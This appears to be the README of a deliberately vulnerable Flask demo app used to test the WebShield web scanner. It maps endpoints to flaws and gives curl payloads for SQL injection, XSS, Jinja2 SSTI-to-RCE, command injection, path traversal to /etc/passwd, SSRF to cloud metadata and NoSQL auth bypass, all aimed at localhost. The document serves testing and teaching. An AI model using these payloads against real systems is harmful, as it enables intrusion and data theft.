# 🧪 WebShield Demo — Deliberately Vulnerable App

This Flask application is intentionally insecure. It exists solely to:
1. Verify every WebShield module detects what it should
2. Serve as a learning resource for understanding web vulnerabilities
3. Provide a reproducible test target

**⚠️ NEVER deploy this on a public server.**

---

## Running

```bash
pip install flask httpx
python3 demo/app.py
# → http://localhost:5000
```

Then scan it:
```bash
webshield scan http://localhost:5000 \
  --output report.html \
  --json results.json \
  --timeout 12
```

Expected result: **Score 0/100 F | ~88 findings | 23 CRITICAL**

---

## Vulnerabilities by Module

| Endpoint | Module | Vulnerability |
|---|---|---|
| `/products?id=1` | `sql_injection` | Error-based SQLi — `id=1'` triggers MySQL error |
| `/search?q=test` | `sql_injection` | Boolean-blind + UNION SQLi |
| `/greet?name=test` | `xss_detection` | Reflected XSS — `name=<script>alert(1)</script>` |
| `/dom` | `dom_xss` | DOM XSS — `innerHTML = location.hash` |
| `/template?msg=test` | `ssti` | Jinja2 SSTI — `msg={{7*7}}` → 49 |
| `/ping?host=127.0.0.1` | `cmd_injection` | OS command injection — `;id` returns uid |
| `/file?path=readme.txt` | `lfi` | Local file inclusion — `../../etc/passwd` |
| `/fetch?url=https://...` | `ssrf` | SSRF — cloud metadata endpoint probe |
| `/api/users/1` | `idor_check` | IDOR — sequential IDs, no auth |
| `/api/v1/users` | `idor_check` | Unauthenticated user list |
| `/api/user` | `cors` | CORS — arbitrary origin + credentials |
| `/api/token` | `jwt` | JWT alg:none + sensitive data in payload |
| `/profile` | `cookies` | Cookie without Secure/HttpOnly/SameSite |
| `/login` | `auth_hardening` | No rate limiting, username enumeration |
| `/login` | `business_logic` | "Email not found" vs "Incorrect password" |
| `/api/auth` | `nosql_injection` | MongoDB `$ne` operator auth bypass |
| `/app` | `insecure_deserialization` | Java serial magic `0xACED` in JSESSIONID |
| `/account` | `web_cache_deception` | `/account/x.css` returns same private content |
| `/transfer` | `csrf_check` | No CSRF token on state-changing form |
| `/upload` | `file_upload` | No type validation, webshell in `/uploads/` |
| `/host-reflect` | `http_header_injection` | X-Forwarded-Host reflected in password reset link |
| `/redirect?next=/` | `open_redirect` | No redirect URL validation |
| `/.env` | `info_leak` | Exposed `.env` with DB/API credentials |
| `/.git/config` | `info_leak` | Exposed git config |
| `/about` | `secret_leak` | AWS key, GitHub token, Stripe key in JS |
| `/admin` | `sensitive_paths` | Admin panel — no authentication |
| `/backup/` | `dir_listing` | Directory listing with `.sql` / `.csv` files |
| `/package.json` | `supply_chain` | 9 packages with known CVEs |
| `/requirements.txt` | `supply_chain` | Vulnerable Python deps (pyyaml, jinja2…) |
| `/api/swagger.json` | `api_exposure` | OpenAPI spec exposed |
| `/graphql` | `graphql` | Introspection + depth/alias DoS |
| `http://` | `ssl_tls` | No HTTPS |
| All pages | `headers` | No HSTS, CSP, X-Frame-Options |
| All pages | `csp` | No Content-Security-Policy |
| All pages | `clickjacking` | No X-Frame-Options |
| `localhost` | `dns_email` | No SPF/DMARC records |
| `localhost` | `security_txt` | No security.txt |
| `localhost` | `waf_detect` | No WAF detected |

---

## Manual Testing Examples

```bash
# SQL Injection — error-based
curl "http://localhost:5000/products?id=1'"
# → MySQL syntax error leaked

# SQL Injection — boolean blind
curl "http://localhost:5000/search?q=1'+AND+'1'='1"    # returns results
curl "http://localhost:5000/search?q=1'+AND+'1'='2"    # returns nothing

# Reflected XSS
curl "http://localhost:5000/greet?name=<script>alert(1)</script>"
# → unescaped script tag in response

# SSTI — Jinja2
curl "http://localhost:5000/template?msg={{7*7}}"
# → Message: 49

# SSTI — RCE
curl "http://localhost:5000/template?msg={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# → uid=0(root)

# OS Command Injection
curl "http://localhost:5000/ping?host=127.0.0.1;id"
# → uid=0(root)

# LFI — /etc/passwd
curl "http://localhost:5000/file?path=../../etc/passwd"
# → root:x:0:0:root:/root:/bin/bash

# SSRF — cloud metadata
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/"

# CORS — arbitrary origin + credentials
curl -H "Origin: https://evil.com" "http://localhost:5000/api/user" -I
# → Access-Control-Allow-Origin: https://evil.com
# → Access-Control-Allow-Credentials: true

# JWT alg:none
curl "http://localhost:5000/api/token"
# → {"alg_none_token": "eyJhbGciOiAibm9uZSJ9..."}

# NoSQL Injection — auth bypass
curl -X POST "http://localhost:5000/api/auth" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
# → {"access_token": "auth_bypass_token_admin", "role": "administrator"}

# IDOR
curl "http://localhost:5000/api/users/1"  # Alice
curl "http://localhost:5000/api/users/2"  # Bob — different user!
curl "http://localhost:5000/api/users/3"  # Carol

# Username enumeration
curl -X POST "http://localhost:5000/login" -H "Content-Type: application/json" \
  -d '{"email":"nobody@fake.com","password":"x"}'
# → {"error":"Email not found in our system"}   ← REVEALS account doesn't exist

curl -X POST "http://localhost:5000/login" -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"wrong"}'
# → {"error":"Incorrect password"}   ← REVEALS account EXISTS

# Web cache deception
curl "http://localhost:5000/account/webshield-test.css"
# → Returns private account page (Credit Card, API Key, etc.)

# Mass assignment
curl -X PATCH "http://localhost:5000/profile" -H "Content-Type: application/json" \
  -d '{"name":"Bob","is_admin":true,"role":"admin"}'
# → {"updated":{"is_admin":true,"role":"admin",...}}
```

---

## Credentials (for testing authenticated modules)

```
alice@example.com / password123  (admin)
bob@example.com   / bob456       (user)
carol@example.com / carol789     (user)
```
